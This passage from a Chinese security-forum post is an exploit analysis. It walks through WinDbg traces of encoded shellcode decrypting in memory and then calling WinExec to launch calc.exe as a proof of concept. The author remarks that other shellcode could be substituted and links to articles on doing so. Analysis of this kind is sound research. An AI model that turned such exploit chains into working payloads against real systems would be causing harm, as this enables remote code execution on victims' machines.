
可以看到，解密前，alpha shellcod部分，随后解密结束之后。

```
0:009> p

eax=04d0035d ebx=7ffe0300 ecx=68031592 edx=6803156c esi=68031460 edi=680124e3

eip=6803155e esp=68031400 ebp=6e6f3176 iopl=0         nv up ei ng nz na pe cy

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287

rsaenh!g_pfnFree+0x2a2:

6803155e 75e2            jne     rsaenh!g_pfnFree+0x286 (68031542)       [br=1]

0:009> bp 68031560

0:009> g

Breakpoint 2 hit

eax=00000410 ebx=7ffe0300 ecx=680318da edx=6803163e esi=68031460 edi=680124e3

eip=68031560 esp=68031400 ebp=6e6f3176 iopl=0         nv up ei pl zr na pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246

rsaenh!g_pfnFree+0x2a4:

68031560 b8b726bfca      mov     eax,0CABF26B7h

0:009> dd 68031580

68031580  223cec9b 265a2caa 6a289c9c 9f7c5610

68031590  90a91aa3 9f8f9004 beec8995 6120d015

680315a0  60351b24 30b44661 a56b0c3a 4eb0584f

680315b0  b3b04c03 65916fd3 87313668 9f7842bd

680315c0  14326fa2 fcc51b10 c16ae469 05721746

680315d0  7f01c860 44127593 5f97a1ee 840f2148

680315e0  4fd6e669 089c4365 23715269 e474df95
```

shellcode已经被解密出来，随后会调用`winexec`，执行`calc`。

```
0:009> p

eax=77ea411e ebx=7ffe0300 ecx=68031614 edx=876f8b31 esi=68031460 edi=680124e3

eip=680315f9 esp=680313fc ebp=68031581 iopl=0         nv up ei pl nz na pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206

rsaenh!g_pfnFree+0x33d:

680315f9 51              push    ecx

0:009> p

eax=77ea411e ebx=7ffe0300 ecx=68031614 edx=876f8b31 esi=68031460 edi=680124e3

eip=680315fa esp=680313f8 ebp=68031581 iopl=0         nv up ei pl nz na pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206

rsaenh!g_pfnFree+0x33e:

680315fa ffe0            jmp     eax {kernel32!WinExec (77ea411e)}

0:009> dd esp

680313f8  68031614 68031633 00000001 00000000

0:009> dc 68031633 l2

68031633  636c6163 6578652e                    calc.exe
```

第二个参数是`0x1`，是`SW_SHOWNORMAL`，但由于服务无窗口，因此`calc`无法弹出。

![](https://bbs.kanxue.com/upload/attach/201704/617488_a6jqny2aj2xvhm9.png)

其实，这个过程可以替换成其他的shellcode，相关的shellcode替换链接可以看我的好基友LCatro的几篇文章，都非常不错。

[811K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Z5N6q4)9J5k6s2y4W2j5#2)9J5k6h3!0J5k6#2)9J5c8X3y4$3k6g2)9J5k6o6t1H3x3e0N6Q4x3X3b7%4x3U0j5&6i4K6u0V1K9s2g2A6i4K6u0V1P5r3W2S2L8W2)9J5k6s2m8G2j5#2)9J5k6r3A6A6k6g2)9J5k6s2S2A6i4K6u0r3](https://bbs.kanxue.com/elink@7f4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Z5N6q4)9J5k6s2y4W2j5#2)9J5k6h3!0J5k6#2)9J5c8X3y4$3k6g2)9J5k6o6t1H3x3e0N6Q4x3X3b7%4x3U0j5&6i4K6u0V1K9s2g2A6i4K6u0V1P5r3W2S2L8W2)9J5k6s2m8G2j5#2)9J5k6r3A6A6k6g2)9J5k6s2S2A6i4K6u0r3)

最后我想说，我在深圳，刚才和几个平时网上的好朋友吃夜宵，聊到这个漏洞，没想到在几个小时前认识的彭博士，就是这个漏洞的作者！真的没有想到，还好自己分析的这套思路和这个漏洞作者的思路相差无几，不然就被打脸了。真的很有缘！一下学到了好多。

这篇最后还是没有按时发出，不过希望能和大家一起学习！谢谢阅读！

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
